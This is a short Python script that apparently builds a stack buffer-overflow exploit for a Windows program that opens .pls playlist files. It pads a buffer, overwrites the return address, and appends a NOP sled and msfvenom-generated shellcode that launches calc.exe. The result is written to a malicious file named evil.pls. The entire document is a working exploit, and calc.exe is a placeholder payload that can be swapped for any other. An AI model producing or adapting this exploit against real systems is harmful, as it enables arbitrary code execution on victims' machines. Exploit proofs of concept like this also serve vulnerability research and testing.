# -*- coding: utf-8 -*-
from struct import pack

evil_buffer = "A" * 17417
evil_buffer += pack("<L",0x100371f5)
evil_buffer += "JUNK"

# msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -b "\x00\x09\x0a" -f python
# bad character \x00\x09\x0a 
buf =  ""
buf += "\xda\xc4\xbd\x9b\xe7\x6b\x06\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x31\x31\x6a\x18\x83\xc2\x04\x03\x6a\x8f\x05"
buf += "\x9e\xfa\x47\x4b\x61\x03\x97\x2c\xeb\xe6\xa6\x6c\x8f"
buf += "\x63\x98\x5c\xdb\x26\x14\x16\x89\xd2\xaf\x5a\x06\xd4"
buf += "\x18\xd0\x70\xdb\x99\x49\x40\x7a\x19\x90\x95\x5c\x20"
buf += "\x5b\xe8\x9d\x65\x86\x01\xcf\x3e\xcc\xb4\xe0\x4b\x98"
buf += "\x04\x8a\x07\x0c\x0d\x6f\xdf\x2f\x3c\x3e\x54\x76\x9e"
buf += "\xc0\xb9\x02\x97\xda\xde\x2f\x61\x50\x14\xdb\x70\xb0"
buf += "\x65\x24\xde\xfd\x4a\xd7\x1e\x39\x6c\x08\x55\x33\x8f"
buf += "\xb5\x6e\x80\xf2\x61\xfa\x13\x54\xe1\x5c\xf8\x65\x26"
buf += "\x3a\x8b\x69\x83\x48\xd3\x6d\x12\x9c\x6f\x89\x9f\x23"
buf += "\xa0\x18\xdb\x07\x64\x41\xbf\x26\x3d\x2f\x6e\x56\x5d"
buf += "\x90\xcf\xf2\x15\x3c\x1b\x8f\x77\x2a\xda\x1d\x02\x18"
buf += "\xdc\x1d\x0d\x0c\xb5\x2c\x86\xc3\xc2\xb0\x4d\xa0\x3d"
buf += "\xfb\xcc\x80\xd5\xa2\x84\x91\xbb\x54\x73\xd5\xc5\xd6"
buf += "\x76\xa5\x31\xc6\xf2\xa0\x7e\x40\xee\xd8\xef\x25\x10"
buf += "\x4f\x0f\x6c\x73\x0e\x83\xec\x5a\xb5\x23\x96\xa2"

evil_buffer += "\x90" * 50
evil_buffer += buf
evil_buffer += "C" * (18000 - len(evil_buffer)) 

payload = "http://" + evil_buffer

file_name = 'evil.pls'
crash_file = open(file_name,'wb')
crash_file.write(payload)
crash_file.close()